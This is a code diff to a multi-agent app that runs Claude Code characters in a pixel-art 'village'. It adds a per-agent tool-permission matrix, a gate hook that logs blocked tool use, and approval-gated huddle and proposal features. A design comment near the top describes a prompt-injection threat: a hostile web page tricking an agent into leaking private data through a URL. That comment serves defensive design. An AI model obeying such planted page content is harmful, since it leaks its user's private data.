@@ -156,6 +156,75 @@ let noAdvisor = false;          // set if this Claude Code doesn't support the a
 let systemPromptFlag = 'replace';
 
 // One message to one agent. Returns the plain text they answered.
+// ---------- the tool matrix (agreed with the Sheriff; Phase 1) ----------
+// Who may use what. Workers get no tools. "library" and "logs" are things the helper adds to
+// the instructions (no tool). A run that loads private data (the library, the calendar, town
+// facts) never gets to open arbitrary web pages: a bad page could trick it into sending that
+// data away in a web address. Legal may open official .gov pages only.
+const CAL = (t) => `mcp__claude_ai_Google_Calendar__${t}`;
+const CALENDAR_READ = { [CAL('list_events')]: { calendarIdIn: ['primary'] }, [CAL('get_event')]: { calendarIdIn: ['primary'] },
+  [CAL('search_events')]: {}, [CAL('suggest_time')]: { maxAttendees: 1 } };
+const OFFICIAL_SITES = (process.env.VILLAGE_OFFICIAL_SITES || '.gov').split(',').map(x => x.trim()).filter(Boolean);
+const MATRIX = {
+  marshall: { calendar: true },
+  clem:     { search: true, fetch: 'any' },                 // Prospecting: research only, no private data in those runs
+  augustus: { library: true, calendar: true },              // Sales
+  jo:       { library: true },                              // Delivery
+  ezra:     { search: true, library: true },                // Product (no page-opening: the library is private)
+  hattie:   { library: true, calendar: true },              // Client Success
+  rufus:    { library: true },                              // Marketing & Content (+ Gmail drafts with the button)
+  winona:   { search: true, calendar: true },               // Partnerships (no page-opening: the calendar is private)
+  mortimer: {},                                             // Finance & Admin (Phase 2)
+  beatrice: { search: true, fetch: 'official', library: true },  // Legal & Compliance
+  silas:    { logs: true },                                 // Operations & Analytics
+};
+const toolsFor = (agent) => {
+  const m = MATRIX[agent] || {}, policy = {};
+  if (m.search) policy.WebSearch = {};
+  if (m.fetch === 'any') policy.WebFetch = {};
+  if (m.fetch === 'official') policy.WebFetch = { hostSuffix: OFFICIAL_SITES };
+  if (m.calendar) Object.assign(policy, CALENDAR_READ);
+  return policy;
+};
+const loadsPrivate = (agent) => { const m = MATRIX[agent] || {}; return !!(m.library || m.calendar) || m.fetch !== 'any'; };
+function toolsNote(agent) {
+  const m = MATRIX[agent] || {}, can = [];
+  if (m.search) can.push('search the web (cite the source address for every fact you use)');
+  if (m.fetch === 'any') can.push('open web pages to read them (never log in or fill in forms)');
+  if (m.fetch === 'official') can.push(`open official government pages (${OFFICIAL_SITES.join(', ')}) to read them`);
+  if (m.calendar) can.push("read the Sheriff's primary calendar (events and free times); never change it");
+  if (agent === 'rufus') can.push('save a finished email or letter as a Gmail draft, but only when the Sheriff presses the button');
+  return can.length ? `\n\n## Tools you can use\nYou can ${can.join('; ')}. Nothing else: you can't send, post, buy, book or change anything.` : '';
+}
+
+// The Village Library: reference files the Sheriff puts in the library/ folder (offers, brand voice,
+// templates...). Added to the instructions of the townspeople the matrix gives it to.
+const LIBRARY = path.join(HERE, '..', 'library');
+function libraryText() {
+  if (!fs.existsSync(LIBRARY)) return '';
+  let out = '', total = 0;
+  for (const name of fs.readdirSync(LIBRARY).sort()) {
+    if (!/\.(md|txt|csv)$/i.test(name) || /^readme\.md$/i.test(name)) continue;
+    let t = ''; try { t = fs.readFileSync(path.join(LIBRARY, name), 'utf8'); } catch { continue; }
+    t = t.slice(0, 40000 - total); total += t.length;
+    out += `\n### ${name}\n${t}\n`;
+    if (total >= 40000) { out += '\n(The rest of the library was too long to include.)\n'; break; }
+  }
+  return out ? `\n\n## The Village Library (reference from the Sheriff)\n${out}` : '';
+}
+// Operations' view: what's been happening (from the helper's own logs; no tool)
+function logsText() {
+  let runs = '';
+  try {
+    const lines = fs.readFileSync(RUNS_FILE, 'utf8').trim().split('\n').slice(1).filter(l => l.startsWith(today()));
+    const by = {}; for (const l of lines) { const a = l.split(',')[1]; by[a] = (by[a] || 0) + 1; }
+    runs = `Claude runs today: ${lines.length}${lines.length ? ' (' + Object.entries(by).map(([a, n]) => `${a === 'marshall' ? 'Marshall' : shortName(a)} ${n}`).join(', ') + ')' : ''}.`;
+  } catch { runs = 'No runs logged yet today.'; }
+  const recent = log.slice(-30).map(e => `- ${e.time.slice(11, 16)} ${e.from} → ${e.to}: ${clip(String(e.text), 160)}`).join('\n');
+  const todos = loadTodos();
+  return `\n\n## Village logs (from the helper)\n${runs}\nTo-dos: ${todos.filter(t => t.status !== 'done' && t.status !== 'declined').length} open, ${todos.filter(t => t.status === 'done').length} done.\nRecent activity:\n${recent || '(none yet)'}`;
+}
+
 // ---------- the lockdown on every Claude Code run ----------
 // - No built-in tools at all (--tools ""): no files, commands, web, scheduling or sub-agents.
 // - None of your own Claude Code settings, plugins, hooks or skills (--setting-sources project,
@@ -166,13 +235,20 @@ let systemPromptFlag = 'replace';
 const GATE = path.join(HERE, 'tool-gate.js');
 const ATTEMPTS_FILE = path.join(HOME, 'tool-attempts.jsonl');
 const shellQuote = (t) => `'${String(t).replace(/'/g, `'\\''`)}'`;
+const BUILT_IN = new Set(['WebSearch', 'WebFetch']);      // the only built-in tools any village run can ever get
+const asPolicy = (tools) => Array.isArray(tools) ? Object.fromEntries(tools.map(t => [t, {}])) : (tools || {});
+const usesConnectors = (tools) => Object.keys(asPolicy(tools)).some(t => t.startsWith('mcp__'));
 function lockdown(agent, tools) {
-  const allowed = tools || [];
-  const gate = [process.execPath, GATE, agent, ATTEMPTS_FILE, ...allowed].map(shellQuote).join(' ');
+  const policy = asPolicy(tools);
+  for (const t of Object.keys(policy)) if (!t.startsWith('mcp__') && !BUILT_IN.has(t)) delete policy[t];
+  const allowed = Object.keys(policy);
+  const gate = [process.execPath, GATE, agent, ATTEMPTS_FILE, JSON.stringify(policy)].map(shellQuote).join(' ');
   const settings = { hooks: { PreToolUse: [{ matcher: '*', hooks: [{ type: 'command', command: gate }] }] } };
-  return ['--tools', '', '--setting-sources', 'project', '--disable-slash-commands', '--settings', JSON.stringify(settings),
-    ...(allowed.length ? ['--allowedTools', allowed.join(','), '--disallowedTools', BLOCKED_TOOLS.join(',')]
-                       : ['--strict-mcp-config', '--disallowedTools', BLOCKED_TOOLS.join(',')])];
+  const builtIns = allowed.filter(t => BUILT_IN.has(t));
+  return ['--tools', builtIns.join(','), '--setting-sources', 'project', '--disable-slash-commands', '--settings', JSON.stringify(settings),
+    ...(allowed.length ? ['--allowedTools', allowed.join(',')] : []),
+    ...(usesConnectors(policy) ? [] : ['--strict-mcp-config']),
+    '--disallowedTools', BLOCKED_TOOLS.filter(t => !allowed.includes(t)).join(',')];
 }
 // tell the Sheriff if an agent tried to use something it isn't allowed to (the gate blocked it)
 let attemptsSeen = fs.existsSync(ATTEMPTS_FILE) ? fs.statSync(ATTEMPTS_FILE).size : 0;
@@ -209,10 +285,11 @@ function countRun() {
 // fresh conversation each time. opts.result receives Claude Code's full answer.
 async function ask(agent, systemPrompt, message, opts = {}) {
   const isWorker = !!workerInfo(agent);
-  const tools = opts.allowTools || null;
+  const tools = opts.allowTools && Object.keys(asPolicy(opts.allowTools)).length ? opts.allowTools : null;
+  const fresh = !!opts.fresh;                                        // a one-off run (e.g. saving a Gmail draft): no memory
   return limited(async () => {
-    const sessions = tools ? {} : readJSON(SESSIONS_FILE, {});
-    const version = crypto.createHash('sha1').update(agent === 'marshall' ? systemPrompt : systemPrompt.split('## Your notes')[0]).digest('hex').slice(0, 12);
+    const sessions = fresh ? {} : readJSON(SESSIONS_FILE, {});
+    const version = crypto.createHash('sha1').update(systemPrompt.split('## Your notes')[0]).digest('hex').slice(0, 12);
     let s = sessions[agent] || {};
     if (s.version !== version) s = { version };                 // instructions changed: fresh conversation
 
@@ -221,7 +298,7 @@ async function ask(agent, systemPrompt, message, opts = {}) {
     const build = () => {
       const args = ['-p', message, '--model', opts.model || (isWorker ? WORKER_MODEL : MODEL), '--output-format', 'json',
         ...lockdown(agent, tools),
-        '--permission-mode', 'dontAsk', '--max-turns', tools ? '4' : '2'];
+        '--permission-mode', 'dontAsk', '--max-turns', tools ? '10' : '2'];
       args.push(...(systemPromptFlag === 'append' ? ['--append-system-prompt-file', promptFile] : ['--system-prompt', systemPrompt]));
       if (agent !== 'marshall' && !isWorker && !opts.model && !noAdvisor && ADVISOR !== 'none') args.push('--advisor', ADVISOR);
       if (s.sessionId) args.push('--resume', s.sessionId);
@@ -229,7 +306,7 @@ async function ask(agent, systemPrompt, message, opts = {}) {
     };
     const started = Date.now();
     if (!underDailyLimit()) throw new Error(`The village has used its ${DAILY_RUN_LIMIT} Claude runs for today (a safety limit). Everyone rests until tomorrow.`);
-    let run = await runClaude(build(), !!tools);
+    let run = await runClaude(build(), usesConnectors(tools));
     if (run.code !== 0 && /unknown option|unknown argument/i.test(run.out + run.err)) {
       throw new Error(`Your Claude Code is too old for the village's safety settings, so nothing ran. Update it (run: claude update), then try again. (${(run.err || run.out).trim().slice(0, 160)})`);
     }
@@ -237,10 +314,10 @@ async function ask(agent, systemPrompt, message, opts = {}) {
     if (run.code !== 0 && /advisor/i.test(said) && !noAdvisor) {
       noAdvisor = true;
       console.log('  note: this Claude Code does not take the advisor option here; townspeople will run without it.');
-      run = await runClaude(build(), !!tools);
+      run = await runClaude(build(), usesConnectors(tools));
     }
-    if (run.code !== 0 && /system-prompt/i.test(run.out + run.err) && systemPromptFlag !== 'append') { systemPromptFlag = 'append'; run = await runClaude(build(), !!tools); }
-    if (s.sessionId && run.code !== 0 && /session|resume/i.test(run.out + run.err)) { delete s.sessionId; run = await runClaude(build(), !!tools); }
+    if (run.code !== 0 && /system-prompt/i.test(run.out + run.err) && systemPromptFlag !== 'append') { systemPromptFlag = 'append'; run = await runClaude(build(), usesConnectors(tools)); }
+    if (s.sessionId && run.code !== 0 && /session|resume/i.test(run.out + run.err)) { delete s.sessionId; run = await runClaude(build(), usesConnectors(tools)); }
     const seconds = ((Date.now() - started) / 1000).toFixed(1);
     countRun();
     checkToolAttempts();
@@ -249,8 +326,8 @@ async function ask(agent, systemPrompt, message, opts = {}) {
     let obj;
     try { obj = JSON.parse(run.out); } catch { throw new Error(`Claude Code didn't answer as expected. ${(run.err || run.out).trim().slice(0, 300)}`); }
     if (opts.result) opts.result(obj);
-    if (obj.session_id && !tools) s.sessionId = obj.session_id;
-    if (tools) return typeof obj.result === 'string' ? obj.result : '';
+    if (obj.session_id && !fresh) s.sessionId = obj.session_id;
+    if (fresh) return typeof obj.result === 'string' ? obj.result : '';
     const latest = readJSON(SESSIONS_FILE, {});                // re-read: someone else's run may have finished meanwhile
     latest[agent] = s;
     writeJSON(SESSIONS_FILE, latest);
@@ -425,7 +502,7 @@ function addNote(agent, section, text) {
 // ---------- Marshall ----------
 function marshallPrompt() {
   const roster = townspeople().map(t => `- ${t.key}: ${t.name} (${t.area})`).join('\n');
-  return fs.readFileSync(MARSHALL_PERSONA, 'utf8') + `\n\nThe townspeople you can hand work to (use their key):\n${roster}\n`;
+  return fs.readFileSync(MARSHALL_PERSONA, 'utf8') + `\n\nThe townspeople you can hand work to (use their key):\n${roster}\n` + `\n\n## Your notes` + toolsNote('marshall') + townFacts();
 }
 const pending = [];             // tasks waiting for the Sheriff's "Send next batch"
 const working = new Map();      // agent key -> task they're working on right now
@@ -443,7 +520,7 @@ function parseTasks(answer, order, extra) {
 
 async function talkToMarshall(text) {
   addLog('Sheriff', 'Marshall', text);
-  const answer = await ask('marshall', marshallPrompt(), text);
+  const answer = await ask('marshall', marshallPrompt(), text, { allowTools: toolsFor('marshall') });
   const reply = sayLine(answer, 320);
   const tasks = parseTasks(answer, text);
   addLog('Marshall', 'Sheriff', reply);
@@ -532,6 +609,143 @@ async function handleTodo(id) {
   if (pending.length) addLog('Marshall', 'Sheriff', `I've handed out ${sent.length}; ${pending.length} more wait for your go-ahead (Send next batch).`, 'system');
 }
 
+// ---------- a proactive town: the morning huddle, questions, proposals, hallway talk ----------
+// Nothing here runs on its own: the huddle starts only when the Sheriff presses "Start the Day",
+// and real hallway conversations happen only on a day that has been started (at most
+// HALLWAY_LIMIT a day). Questions go to the Sheriff; the answers become town facts everyone
+// knows. Proposed next actions go on the to-do list as "Proposed": nothing happens until approved.
+const QUESTIONS_FILE = path.join(HOME, 'questions.json');
+const DAY_FILE = path.join(HOME, 'day.json');
+const HALLWAY_LIMIT = Number(process.env.VILLAGE_HALLWAY_LIMIT) || 10;
+const dayState = () => { const d = readJSON(DAY_FILE, {}); return d.date === today() ? d : { date: today(), started: false, huddle: 'not started', hallways: 0 }; };
+const saveDay = (d) => writeJSON(DAY_FILE, d);
+const loadQuestions = () => readJSON(QUESTIONS_FILE, []);
+const sameText = (a, b) => a.toLowerCase().replace(/[^a-z0-9 ]/g, '').replace(/\s+/g, ' ').trim() === b.toLowerCase().replace(/[^a-z0-9 ]/g, '').replace(/\s+/g, ' ').trim();
+function addQuestion(from, text, via) {
+  text = tidy(text, 300);
+  if (isNone(text) || text.length < 8) return null;
+  const all = loadQuestions();
+  if (all.some(q => q.status === 'open' && sameText(q.text, text))) return null;
+  const q = { id: all.reduce((m, x) => Math.max(m, x.id), 0) + 1, from, fromName: from === 'marshall' ? 'Marshall' : shortName(from), text, via, status: 'open', time: new Date().toISOString() };
+  all.push(q); writeJSON(QUESTIONS_FILE, all);
+  addLog(q.fromName, 'Sheriff', `Question: ${text}`, 'question');
+  return q;
+}
+function addProposal(from, text, via) {
+  text = tidy(text, 300);
+  if (isNone(text) || text.length < 8) return null;
+  const todos = loadTodos();
+  if (todos.some(t => (t.status === 'proposed' || t.status !== 'done') && sameText(t.text, text))) return null;
+  const todo = { id: todos.reduce((m, x) => Math.max(m, x.id), 0) + 1, text, status: 'proposed', proposedBy: from === 'marshall' ? 'Marshall' : shortName(from), via,
+    created: new Date().toISOString(), assignments: [] };
+  todos.push(todo); saveTodos(todos);
+  addLog(todo.proposedBy, 'Sheriff', `Proposed to-do: ${text}`, 'proposal');
+  return todo;
+}
+function noticeOpenItems() {
+  const qs = loadQuestions().filter(q => q.status === 'open').length;
+  const ps = loadTodos().filter(t => t.status === 'proposed').length;
+  resolveNotices(n => n.kind === 'questions' || n.kind === 'proposals');
+  if (qs) addNotice('questions', `The town has ${qs} question${qs > 1 ? 's' : ''} for you. Answer them so everyone knows.`, { questions: true });
+  if (ps) addNotice('proposals', `${ps} proposed to-do${ps > 1 ? 's' : ''} waiting for your Approve or Decline.`, { todo: true });
+}
+const HUDDLE_ASK = `It's the morning huddle. Think about your area, your notes and what the town knows so far. What do you need from the Sheriff to do your job well, and what should happen next?
+After your SAY line (one line to the room), add:
+QUESTION: a question for the Sheriff that you truly need answered and don't already know (one per line, up to 3)
+PROPOSE: a concrete next action for the town, small enough to do soon (one per line, up to 2)
+ASK key: something you need from another townsperson (use their key; at most 1; leave it out if not needed)
+Then your NOTE line. Don't repeat questions the town facts already answer.`;
+let huddleRunning = false;
+async function runHuddle() {
+  if (huddleRunning) throw new Error('The huddle is already running.');
+  huddleRunning = true;
+  const day = dayState(); day.started = true; day.huddle = 'running'; day.startedAt = new Date().toISOString(); saveDay(day);
+  addLog('Sheriff', 'Everyone', 'Start the day: morning huddle.', 'system');
+  addLog('Marshall', 'Everyone', "Morning, all. Huddle time: tell me what you need from the Sheriff and what we should do next.", 'chat', { chat: 'marshall' });
+  const keys = townspeople().map(t => t.key), raw = [];
+  try {
+    await Promise.all(keys.map(async (k) => {
+      working.set(k, 'Morning huddle');
+      try {
+        const answer = await ask(k, townspersonPrompt(k, true), HUDDLE_ASK);
+        noteFrom(k, answer);
+        addLog(shortName(k), 'Everyone', sayLine(answer, 300), 'chat');
+        raw.push({ k, questions: [...answer.matchAll(/^\s*\**\s*QUESTION\s*\**\s*:\s*(.+)$/gim)].map(m => m[1]).slice(0, 3),
+          proposals: [...answer.matchAll(/^\s*\**\s*PROPOSE\s*\**\s*:\s*(.+)$/gim)].map(m => m[1]).slice(0, 2),
+          asks: [...answer.matchAll(/^\s*\**\s*ASK\s+([a-z]+)\s*\**\s*:\s*(.+)$/gim)].map(m => ({ to: m[1].toLowerCase(), text: m[2] })).slice(0, 1) });
+      } catch (e) { addLog(shortName(k), 'Everyone', `(couldn't join the huddle: ${e.message})`, 'problem'); }
+      finally { working.delete(k); }
+    }));
+    // Marshall merges it all: no duplicates, the most useful first
+    const listing = raw.map(r => `${r.k}:\n${r.questions.map(q => `  QUESTION: ${q}`).join('\n')}\n${r.proposals.map(p => `  PROPOSE: ${p}`).join('\n')}\n${r.asks.map(a => `  ASK ${a.to}: ${a.text}`).join('\n')}`).join('\n');
+    const merged = await ask('marshall', marshallPrompt(),
+      `Morning huddle results from the townspeople:\n${listing}\n\nMerge them for the Sheriff. Combine duplicates, keep each to one clear line, most important first, and drop anything the town facts already answer.\n` +
+      `Answer in exactly these lines and nothing else:\nSAY: one or two sentences to the Sheriff summing up the huddle\nQUESTION key: a question for the Sheriff, with the key of whoever asked it (at most 12)\nPROPOSE key: a proposed to-do, with the key of whoever proposed it (at most 8)\nPASS from to: something one townsperson needs from another (from and to are keys; at most 5)`);
+    const known = new Set(['marshall', ...keys]);
+    let nq = 0, np = 0;
+    for (const m of merged.matchAll(/^\s*\**\s*QUESTION\s+([a-z]+)\s*\**\s*:\s*(.+)$/gim)) if (known.has(m[1].toLowerCase()) && nq < 12 && addQuestion(m[1].toLowerCase(), m[2], 'huddle')) nq++;
+    for (const m of merged.matchAll(/^\s*\**\s*PROPOSE\s+([a-z]+)\s*\**\s*:\s*(.+)$/gim)) if (known.has(m[1].toLowerCase()) && np < 8 && addProposal(m[1].toLowerCase(), m[2], 'huddle')) np++;
+    for (const m of merged.matchAll(/^\s*\**\s*PASS\s+([a-z]+)\s+([a-z]+)\s*\**\s*:\s*(.+)$/gim)) {
+      const [from, to] = [m[1].toLowerCase(), m[2].toLowerCase()];
+      if (!known.has(from) || !keys.includes(to)) continue;
+      addNote(to, 'Open items', `${from === 'marshall' ? 'Marshall' : shortName(from)} needs from you: ${tidy(m[3], 250)}`);
+      addLog(from === 'marshall' ? 'Marshall' : shortName(from), shortName(to), tidy(m[3], 250), 'task');
+    }
+    addLog('Marshall', 'Sheriff', `${sayLine(merged, 300)} (${nq} question${nq === 1 ? '' : 's'} for you, ${np} proposed to-do${np === 1 ? '' : 's'}.)`, 'relay', { chat: 'marshall' });
+    const d = dayState(); d.huddle = 'done'; d.huddleDone = new Date().toISOString(); saveDay(d);
+    noticeOpenItems();
+  } catch (e) {
+    const d = dayState(); d.huddle = 'problem'; saveDay(d);
+    addLog('Marshall', 'Sheriff', `The huddle stopped: ${e.message}`, 'problem', { chat: 'marshall' });
+    addNotice('problem', `The morning huddle stopped: ${clip(e.message, 160)}`, { log: true });
+  } finally { huddleRunning = false; }
+}
+function answerQuestion(id, answer, skip) {
+  const all = loadQuestions(), q = all.find(x => x.id === id);
+  if (!q || q.status !== 'open') throw new Error('That question is no longer open.');
+  if (skip) { q.status = 'skipped'; }
+  else {
+    answer = String(answer || '').replace(/\s+/g, ' ').trim().slice(0, 1500);
+    if (!answer) throw new Error('Write an answer first.');
+    q.status = 'answered'; q.answer = answer; q.answered = new Date().toISOString();
+    fs.appendFileSync(FACTS_FILE, `- ${today()} ${q.fromName} asked: ${q.text}\n  The Sheriff: ${answer}\n`);
+    if (q.from !== 'marshall') addNote(q.from, "What I've learned", `The Sheriff answered my question "${clip(q.text, 120)}": ${clip(answer, 250)}`);
+    addLog('Sheriff', q.fromName, `${q.text} → ${answer}`, 'chat');
+  }
+  writeJSON(QUESTIONS_FILE, all);
+  noticeOpenItems();
+  return q;
+}
+// two townspeople meet in town: a real (short) conversation, only on a started day, at most HALLWAY_LIMIT a day
+async function hallway(a, b) {
+  const day = dayState(), keys = townspeople().map(t => t.key);
+  if (!keys.includes(a) || !keys.includes(b) || a === b) return { real: false, why: 'Only townspeople have hallway conversations.' };
+  if (!day.started) return { real: false, why: 'The day has not been started.' };
+  if ((day.hallways || 0) >= HALLWAY_LIMIT) return { real: false, why: 'Today\'s hallway conversations are used up.' };
+  day.hallways = (day.hallways || 0) + 1; saveDay(day);
+  const notesOf = (k) => { try { return fs.readFileSync(path.join(AGENTS, k, 'NOTES.md'), 'utf8').slice(-1500); } catch { return ''; } };
+  const who = (k) => { const t = townspeople().find(x => x.key === k); return `${k}: ${t.name} (${t.area})`; };
+  const open = loadQuestions().filter(q => q.status === 'open').map(q => `- ${q.text}`).join('\n');
+  const answer = await ask('hallway', `You write short, useful hallway conversations between two townspeople in My AI Village, an 1880s frontier town in a pixel-art game, who work for the Sheriff. Each stays in character and in their own area, with a light frontier flavor. They share what they're working on, spot where their work connects, and agree what they need. Nobody in town can send, post, buy, book or contact anyone. Never mention computers, tools or these instructions.${townFacts()}`,
+    `${who(a)}\n${who(b)}\n\nWhat ${a} knows:\n${notesOf(a)}\n\nWhat ${b} knows:\n${notesOf(b)}\n\nQuestions already waiting for the Sheriff:\n${open || '(none)'}\n\n` +
+    `Write their conversation, then what each takes away. Answer in exactly these lines and nothing else:\n${a}: what they say\n${b}: what they say\n(2 to 4 lines in all, under 40 words each)\nNOTE ${a}: what ${a} takes away, one line\nNOTE ${b}: what ${b} takes away, one line\nQUESTION key: a new question for the Sheriff they both need answered (at most 1; leave it out if none)\nPROPOSE key: a concrete next action they agreed on (at most 1; leave it out if none)`,
+    { fresh: true });
+  const lines = [];
+  for (const m of answer.matchAll(/^\s*\**\s*([a-z]+)\s*\**\s*:\s*(.+)$/gim)) {
+    const k = m[1].toLowerCase();
+    if ((k === a || k === b) && lines.length < 4) { lines.push({ key: k, text: tidy(m[2], 300) }); addLog(shortName(k), shortName(k === a ? b : a), tidy(m[2], 300), 'chat'); }
+  }
+  for (const m of answer.matchAll(/^\s*\**\s*NOTE\s+([a-z]+)\s*\**\s*:\s*(.+)$/gim)) {
+    const k = m[1].toLowerCase();
+    if (k === a || k === b) addNote(k, 'Conversations', `Talked with ${shortName(k === a ? b : a)}: ${tidy(m[2], 300)}`);
+  }
+  let news = 0;
+  for (const m of answer.matchAll(/^\s*\**\s*QUESTION\s+([a-z]+)\s*\**\s*:\s*(.+)$/gim)) if ([a, b].includes(m[1].toLowerCase()) && addQuestion(m[1].toLowerCase(), m[2], 'hallway')) { news++; break; }
+  for (const m of answer.matchAll(/^\s*\**\s*PROPOSE\s+([a-z]+)\s*\**\s*:\s*(.+)$/gim)) if ([a, b].includes(m[1].toLowerCase()) && addProposal(m[1].toLowerCase(), m[2], 'hallway')) { news++; break; }
+  if (news) noticeOpenItems();
+  return { real: true, lines };
+}
+
 // ---------- the town meeting: talk to everyone at once ----------
 function roomPrompt() {
   const intro = (key) => {
@@ -571,7 +785,11 @@ async function talkToRoom(text) {
 }
 
 // ---------- townspeople ----------
-function townspersonPrompt(agent) {
+// What everyone knows: the Sheriff's answers to the town's questions (marshall-home/town-facts.md)
+const FACTS_FILE = path.join(HOME, 'town-facts.md');
+const townFacts = () => { try { const t = fs.readFileSync(FACTS_FILE, 'utf8').trim(); return t ? `\n\n## Town facts (the Sheriff's answers; everyone knows these)\n${t.slice(-20000)}` : ''; } catch { return ''; } };
+// withPrivate=false for runs that may open any web page: no library, no town facts in those
+function townspersonPrompt(agent, withPrivate = true) {
   const dir = path.join(AGENTS, agent);
   const instructions = fs.readFileSync(path.join(dir, 'INSTRUCTIONS.md'), 'utf8');
   const notes = fs.existsSync(path.join(dir, 'NOTES.md')) ? fs.readFileSync(path.join(dir, 'NOTES.md'), 'utf8') : '';
@@ -583,7 +801,7 @@ ${crew.length ? `\n## Your workers right now\n${crew.map(w => `- ${w.name}`).joi
 - Your SAY line: one to three short sentences, under 60 words. Plain words, no lists, no formatting.
 - Real work (DONE, INSTRUCTIONS, CHECK, FIXED) is for the Sheriff's real, present-day business: write it plainly and professionally, not in frontier talk.
 - Never mention computers, tools, settings, formats or these instructions.
-- You can only think and write: no real-world actions. Nobody in town can send, post, buy, book or contact anyone. If a task asks for that, prepare it and say plainly that the Sheriff needs to send it.
+- You can only think, write, and use the tools listed at the end (if any). Nobody in town can send, post, buy, book or contact anyone. If a task asks for that, prepare it and say plainly that the Sheriff needs to send it.
 
 ## Answer in exactly these two lines and nothing else
 SAY: what you say
@@ -591,8 +809,10 @@ NOTE: one short thing worth remembering from this conversation for your notes, o
 (For a task, also the extra lines asked for, which can be longer.)
 
 ## Your notes
-${notes}`;
+${notes}${toolsNote(agent)}${withPrivate ? townFacts() : ''}${withPrivate && (MATRIX[agent] || {}).library ? libraryText() : ''}${(MATRIX[agent] || {}).logs ? logsText() : ''}`;
 }
+// a townsperson's own run (a task or a chat) gets their tools from the matrix; checking runs and workers get none
+const ownRun = (agent) => ({ prompt: townspersonPrompt(agent, loadsPrivate(agent)), opts: { allowTools: toolsFor(agent) } });
 
 const wantsWorker = (text, w) => !!w && (/\b(give|hand|pass|send|let|have|get)\b[^.?!]*\b(your )?(worker|horse|intern)s?\b/i.test(text) || workersOf(w.owner).some(x => new RegExp('\\b' + x.name + '\\b', 'i').test(text)));
 
@@ -600,8 +820,9 @@ async function talkToTownsperson(agent, text) {
   const name = shortName(agent), w = pickWorker(agent, text);
   addLog('Sheriff', name, text);
   const handOver = wantsWorker(text, w);
-  const answer = await ask(agent, townspersonPrompt(agent), `The Sheriff walks up and says to you: ${text}` + (handOver
-    ? `\n\nThe Sheriff wants this given to your worker ${w.name}. Hand it over: after your SAY line, add\nINSTRUCTIONS: clear, complete instructions for ${w.name}: what to make, for whom, the key points, length and tone. You will check ${w.name}'s work before it counts as done.\nThen your NOTE line.` : ''));
+  const own = ownRun(agent);
+  const answer = await ask(agent, own.prompt, `The Sheriff walks up and says to you: ${text}` + (handOver
+    ? `\n\nThe Sheriff wants this given to your worker ${w.name}. Hand it over: after your SAY line, add\nINSTRUCTIONS: clear, complete instructions for ${w.name}: what to make, for whom, the key points, length and tone. You will check ${w.name}'s work before it counts as done.\nThen your NOTE line.` : ''), own.opts);
   const reply = sayLine(answer, 400);
   const noted = noteFrom(agent, answer);
   addLog(name, 'Sheriff', reply);
@@ -636,8 +857,9 @@ async function doTask(t) {
       (toWorker ? `The Sheriff wants this given to ${w.name}: hand it over.\n` : `Decide whether ${w.name} can handle this one.\n`) +
       `If ${w.name} should do it, after your SAY line add:\nWORKER: yes\nINSTRUCTIONS: clear, complete instructions for ${w.name}: what to make, for whom, the key points, length and tone.\n` +
       `If you'll do it yourself, after your SAY line add:\nWORKER: no\n${YOURSELF}\n${HELP_ASK}`;
-  const answer = await ask(t.agent, townspersonPrompt(t.agent),
-    `Marshall, the Deputy, passes you this task from the Sheriff's ${t.todoId ? 'to-do list' : 'order'} ("${t.order}"): ${t.task}\n${how}\n${MAKE_FILES}\nIf your worker makes the files, tell them so in your instructions, including which kind of file.${designGuide(t.order + ' ' + t.task)}`);
+  const own = ownRun(t.agent);
+  const answer = await ask(t.agent, own.prompt,
+    `Marshall, the Deputy, passes you this task from the Sheriff's ${t.todoId ? 'to-do list' : 'order'} ("${t.order}"): ${t.task}\n${how}\n${MAKE_FILES}\nIf your worker makes the files, tell them so in your instructions, including which kind of file.${designGuide(t.order + ' ' + t.task)}`, own.opts);
   const reply = sayLine(answer, 400);
   noteFrom(t.agent, answer);
   askedForHelp(t.agent, answer);
@@ -773,7 +995,7 @@ SAY: one short line to the Sheriff
 DRAFT: saved, or not saved and why
 LINK: the draft's link if the tool gave one, or none`,
     `The Sheriff's order: "${d.order}"\nThe task: ${d.task}\n\nThe finished piece:\n${d.work}`,
-    { allowTools: [DRAFT_TOOL], result: (o) => { obj = o; } });
+    { allowTools: [DRAFT_TOOL], fresh: true, result: (o) => { obj = o; } });
   const denied = (obj && obj.permission_denials || []).map(x => x.tool_name).filter(Boolean);
   const saved = /^\W*saved/i.test(grab(answer, 'DRAFT'));
   const link = (answer.match(/https:\/\/mail\.google\.com\/\S+/) || [])[0] || '';
@@ -805,7 +1027,7 @@ function resolveNotices(match) {
   if (changed) writeJSON(NOTICES_FILE, all);
 }
 // a Mac notification (Notification Center), so the Sheriff hears even with the village closed
-const NOTICE_TITLES = { workshop: 'Ready to preview', published: 'Published', candidate: 'A candidate is waiting', draft: 'Ready for your Gmail drafts', send: 'Ready for you to send', done: 'Done', batch: 'Waiting for your go-ahead', nofit: 'Nobody fits', problem: 'A problem', help: 'Asking for help' };
+const NOTICE_TITLES = { questions: 'Questions for you', proposals: 'Proposed to-dos', workshop: 'Ready to preview', published: 'Published', candidate: 'A candidate is waiting', draft: 'Ready for your Gmail drafts', send: 'Ready for you to send', done: 'Done', batch: 'Waiting for your go-ahead', nofit: 'Nobody fits', problem: 'A problem', help: 'Asking for help' };
 function macNotify(n) {
   if (process.platform !== 'darwin' || !settings().macNotifications) return;
   const q = (t) => '"' + String(t).replace(/[\r\n]+/g, ' ').replace(/\\/g, '\\\\').replace(/"/g, '\\"') + '"';
@@ -1080,6 +1302,12 @@ const server = http.createServer(async (req, res) => {
     res.writeHead(200, { 'Content-Type': 'application/zip', 'Content-Disposition': `attachment; filename="${item.slug}.zip"`, 'Cache-Control': 'no-store', 'X-Content-Type-Options': 'nosniff' });
     return res.end(zip);
   }
+  // the Village Library folder, opened in Finder (Mac only)
+  if (req.method === 'POST' && url.pathname === '/library-reveal') {
+    fs.mkdirSync(LIBRARY, { recursive: true });
+    if (process.platform === 'darwin') execFile('open', [LIBRARY], () => {});
+    return send(200, { ok: true, folder: LIBRARY });
+  }
   // "Show in Finder": open the item's folder (Mac only; nothing else is ever opened)
   if (req.method === 'POST' && url.pathname === '/workshop-reveal') {
     const j = await readBody(req, 1000);
@@ -1149,6 +1377,41 @@ const server = http.createServer(async (req, res) => {
     finally { busyAgents.delete('gmail:' + id); }
     return;
   }
+  // the day: Start the Day (morning huddle), questions, hallway conversations
+  if (req.method === 'GET' && url.pathname === '/day') {
+    const d = dayState();
+    return send(200, { ...d, running: huddleRunning, hallwayLimit: HALLWAY_LIMIT, questions: loadQuestions().filter(q => q.status === 'open').length });
+  }
